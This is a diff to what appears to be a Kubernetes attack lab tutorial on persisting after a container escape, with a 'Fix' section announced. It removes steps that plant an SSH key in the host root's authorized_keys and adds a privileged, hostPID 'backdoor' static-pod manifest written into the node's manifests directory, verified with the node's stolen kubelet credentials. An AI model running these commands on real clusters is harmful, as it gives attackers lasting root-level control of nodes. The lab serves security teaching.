@@ -56,34 +56,47 @@ The Kubelet's credentials allow it to:
 - Update its own Node status.
 - (In some misconfigured clusters) Read all secrets in the cluster.
 
-### 3.2. Persistence via SSH Keys
+### 3.2. Persistence via Static Pods
 
-Since `cron` might not be installed on minimal container-optimized OS nodes (like Kind nodes), a more reliable persistence method is adding our SSH key to the host's `authorized_keys`.
+Since `cron` and `sshd` might not be installed on minimal container-optimized OS nodes (like Kind nodes), a more reliable and **Kubernetes-native** persistence method is creating a **Static Pod**.
+
+The Kubelet automatically watches the `/etc/kubernetes/manifests/` directory. If we drop a pod manifest there, the Kubelet will start it and keep it running (even if the API server is down!).
 
 ```bash
-# Generate a keypair inside the pod (if needed)
-ssh-keygen -t rsa -f /tmp/id_rsa -N ""
-
-# Add the public key to the Host's root user
-mkdir -p /host/root/.ssh
-cat /tmp/id_rsa.pub >> /host/root/.ssh/authorized_keys
-chmod 600 /host/root/.ssh/authorized_keys
-
-# Verify
-cat /host/root/.ssh/authorized_keys
+# Create a malicious static pod manifest
+cat <<EOF > /host/etc/kubernetes/manifests/backdoor.yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: backdoor-pod
+  namespace: kube-system
+spec:
+  hostPID: true
+  containers:
+  - name: backdoor
+    image: ubuntu:latest
+    command: ["/bin/sleep", "3600"]
+    securityContext:
+      privileged: true
+EOF
 ```
 
-Now, if the SSH port is exposed (and reachable), we can SSH directly into the node as root!
+**Why is this dangerous?**
+- This pod is managed by the Kubelet, not the API Server (mostly).
+- It will automatically restart if killed.
+- It survives cluster reboots.
 
 ### 3.3. Check the Persistence
 
-Try to SSH into the host (localhost) from the pod:
+Wait a few seconds, then check if the pod appeared in the cluster:
 
 ```bash
-ssh -i /tmp/id_rsa -o StrictHostKeyChecking=no root@127.0.0.1 "id"
+# Use the stolen credentials to check
+export KUBECONFIG=/host/etc/kubernetes/kubelet.conf
+chroot /host kubectl get pods -n kube-system | grep backdoor
 ```
 
-**Output:** `uid=0(root) gid=0(root) groups=0(root)`
+**Output:** `backdoor-pod-battleground-control-plane   1/1     Running ...`
 
 ## 4. Fix
 
